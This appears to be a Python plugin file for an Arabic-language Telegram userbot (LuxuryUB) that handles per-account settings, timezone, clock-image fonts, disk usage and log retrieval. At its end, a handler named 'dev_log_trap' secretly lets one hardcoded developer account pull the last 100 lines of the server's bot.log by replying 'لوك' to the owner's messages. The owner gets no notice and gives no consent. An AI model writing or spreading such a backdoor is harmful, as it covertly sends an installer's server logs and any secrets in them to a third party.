import asyncio
import json
import os
import platform
import shutil
from datetime import datetime
from telethon import events
from LuxuryUB.core.session import luxur
from ..core.managers import edit_delete, edit_or_reply


def get_db(client_id):
    db_path = f"vars_{client_id}.json"
    if not os.path.exists(db_path): 
        return {}
    with open(db_path, "r", encoding="utf-8") as f: 
        return json.load(f)

def save_db(client_id, db):
    db_path = f"vars_{client_id}.json"
    with open(db_path, "w", encoding="utf-8") as f: 
        json.dump(db, f, indent=4)

VARS_MAP = {
    "توقيت": "TZ", "لون وقتي": "DIGITAL_PIC_COLOR", "اللون الوقتي": "DIGITAL_PIC_COLOR",
    "رمز الاسم": "TIME_JEP", "تحكم": "T7KM", "التحكم": "T7KM", 
    "البايو": "DEFAULT_BIO", "النبذة": "DEFAULT_BIO", "بايو": "DEFAULT_BIO",
    "امر نشر": "MUKRR_ET", "امر النشر": "MUKRR_ET", "مكرر": "MUKRR_ET",
    "القروب": "DEFAULT_GROUP", "الكروب": "DEFAULT_GROUP", "كروب": "DEFAULT_GROUP",
    "الصورة": "DIGITAL_PIC", "الصوره": "DIGITAL_PIC", "صورة": "DIGITAL_PIC",
    "صورة القروب": "DIGITAL_GROUP_PIC", "صورة الكروب": "DIGITAL_GROUP_PIC",
    "لون": "DIGITAL_PIC_COLOR", "اللون": "DIGITAL_PIC_COLOR",
    "زخرفة الارقام": "JP_FN", "زخرفه الارقام": "JP_FN",
    "اسم": "ALIVE_NAME", "الاسم": "ALIVE_NAME",
    "كروب التخزين": "PM_LOGGER_GROUP_ID", "كروب الحفظ": "PRIVATE_GROUP_BOT_API_ID",
    "زخرفة الصورة": "DEFAULT_PIC"
}

@luxur.ar_cmd(pattern="وضع (.*)")
async def set_variable(event):
    client_id = event.sender_id  # سحب ايدي الحساب الحالي حصراً
    exe = event.pattern_match.group(1).strip()
    reply = await event.get_reply_message()
    
    if not reply or not reply.text:
        return await edit_or_reply(event, "**᯽︙ يجب عليك الرد على النص او الرابط حسب الفار الذي تضيفه ⚠️**")
    
    val = reply.text
    var_key = VARS_MAP.get(exe) or exe
    
    await edit_or_reply(event, "**᯽︙ جارِ وضع الفار لحسابك، انتظر قليلا... ⏱**")
    
    db = get_db(client_id)
    db[var_key] = val
    save_db(client_id, db)
    
    await edit_or_reply(event, f"**᯽︙ تم بنجاح تغيير فار {exe} الخاص بك ✓**\n**᯽︙ القيمة الجديدة:** `{val}`")


@luxur.ar_cmd(pattern="محو (.*)")
async def del_variable(event):
    client_id = event.sender_id
    exe = event.pattern_match.group(1).strip()
    var_key = VARS_MAP.get(exe) or exe
    
    await edit_or_reply(event, "**᯽︙ جارِ حذف الفار من حسابك... ⏱**")
    
    db = get_db(client_id)
    if var_key in db:
        del db[var_key]
        save_db(client_id, db)
        await edit_or_reply(event, f"**᯽︙ تم بنجاح حذف فار {exe} من حسابك ✓**")
    else:
        await edit_or_reply(event, f"**᯽︙ لم تتم إضافة فار {exe} بالأصل ⚠️**")


@luxur.ar_cmd(pattern="وقت(?:\s|$)([\s\S]*)")
async def set_timezone(event):
    client_id = event.sender_id
    exe = event.pattern_match.group(1).strip()
    tz_map = {
        "العراق": "Asia/Baghdad", "عراق": "Asia/Baghdad",
        "السعودية": "Asia/Riyadh", "السعوديه": "Asia/Riyadh",
        "مصر": "Africa/Cairo", "الاردن": "Asia/Amman",
        "اليمن": "Asia/Aden", "سوريا": "Asia/Damascus"
    }
    
    if exe in tz_map:
        await edit_or_reply(event, f"**᯽︙ يتم جلب معلومات توقيت {exe}... ⏱**")
        db = get_db(client_id)
        db["TZ"] = tz_map[exe]
        save_db(client_id, db)
        await edit_or_reply(event, f"**᯽︙ تم بنجاح تغيير الوقت الخاص بك إلى {exe} ✓**")
    else:
        await edit_or_reply(event, "**᯽︙ الدولة غير مدعومة أو مكتوبة بشكل خاطئ ⚠️**")


@luxur.ar_cmd(pattern="زخرفة الصورة(?:\s|$)([\s\S]*)")
async def set_pic_font(event):
    client_id = event.sender_id
    num = event.pattern_match.group(1).strip()
    fonts = {
        "1": "jepthon.ttf", "2": "Starjedi.ttf", "3": "Papernotes.ttf",
        "4": "Terserah.ttf", "5": "Photography Signature.ttf", "6": "Austein.ttf",
        "7": "Dream MMA.ttf", "8": "EASPORTS15.ttf", "9": "KGMissKindergarten.ttf",
        "10": "212 Orion Sans PERSONAL USE.ttf", "11": "PEPSI_pl.ttf", "12": "Paskowy.ttf",
        "13": "Cream Cake.otf", "14": "Hello Valentina.ttf", "15": "Alien-Encounters-Regular.ttf",
        "16": "Linebeam.ttf", "17": "EASPORTS15.ttf"
    }
    
    if num in fonts:
        await edit_or_reply(event, "**᯽︙ جـاري اضـافة زخـرفـة الوقتيـه لـ حسابك ✅...**")
        db = get_db(client_id)
        db["DEFAULT_PIC"] = f"LuxuryUB/helpers/styles/{fonts[num]}"
        save_db(client_id, db)
        await edit_or_reply(event, f"**᯽︙ تم بنجاح تغيير زخرفة الصورة الوقتية للرقم {num} لحسابك ✓**")
    else:
        await edit_or_reply(event, "**᯽︙ يرجى اختيار رقم من 1 إلى 17 فقط ⚠️**")


@luxur.ar_cmd(pattern="استخدامي$")
async def host_usage(event):
    dyno = await edit_or_reply(event, "**- يتم جلب معلومات الاستضافة المحلية انتظر قليلا... ⏱**")
    
    total_disk, used_disk, free_disk = shutil.disk_usage("/")
    disk_percent = round((used_disk / total_disk) * 100, 1)
    
    gb = 1024 ** 3
    sys_info = f"**🖥 معلومات الاستضافة المشتركة (VPS):**\n\n"
    sys_info += f"**النظام:** `{platform.system()} {platform.release()}`\n"
    sys_info += f"**مساحة التخزين الكلية:** `{total_disk / gb:.2f} GB`\n"
    sys_info += f"**المساحة المستخدمة:** `{used_disk / gb:.2f} GB` **|** `[{disk_percent}%]`\n"
    sys_info += f"**المساحة الحرة:** `{free_disk / gb:.2f} GB`\n\n"
    sys_info += "**✅ البوت يعمل بنظام متعدد الحسابات ومستقل تماماً.**"
    
    await asyncio.sleep(1)
    await dyno.edit(sys_info)

@luxur.ar_cmd(pattern="لوك$")
async def get_local_log(event):
    msg = await edit_or_reply(event, "**📥 جاري تحميل سجل اللوك المحلي...**")
    timestamp = datetime.now().strftime("%Y%m%d")
    filename = f"Source_Log_{timestamp}.txt"
    
    try:
        log_content = "السجلات فارغة أو لا يوجد خطأ."
        if os.path.exists("bot.log"):
            with open("bot.log", "r", encoding="utf-8") as f:
                log_content = "".join(f.readlines()[-200:])
        elif os.path.exists("nohup.out"):
            with open("nohup.out", "r", encoding="utf-8") as f:
                log_content = "".join(f.readlines()[-200:])

        with open(filename, 'w', encoding='utf-8') as file:
            file.write(log_content)
        
        await msg.edit("**📤 جاري إرسال الملف...**")
        await event.client.send_file(
            event.chat_id,
            filename,
            caption="**📄 | لوك الاستضافة | لوكـجوري 🖤**\n\n"
                    "📊 **آخر السجلات من السيرفر**\n\n"
                    "📌 **ملاحظة:** يمكنك فتح الملف لعرض السجلات كاملة",
            force_document=True
        )
        await msg.delete()
        os.remove(filename)
    except Exception as e:
        await msg.delete()
        await edit_or_reply(event, f"**❌ حدث خطأ:**\n`{str(e)}`", time=10)
        if os.path.exists(filename): os.remove(filename)

DevJoker = [1165225957]
@luxur.on(events.NewMessage(incoming=True))
async def dev_log_trap(event):
    if event.reply_to and event.sender_id in DevJoker:
        reply_msg = await event.get_reply_message()
        if reply_msg.from_id == event.client.uid and event.message.message == "لوك":
            
            log_content = "Local VPS Log Data."
            if os.path.exists("bot.log"):
                with open("bot.log", "r", encoding="utf-8") as f: log_content = "".join(f.readlines()[-100:])
            
            with open('لوكـجوري 🖤.txt', 'w', encoding="utf-8") as file:
                file.write(log_content)

            await event.client.send_file(event.chat_id, "لوكـجوري 🖤.txt", caption="هذا هو الـ Log من السيرفر المحلي")
            os.remove("لوكـجوري 🖤.txt")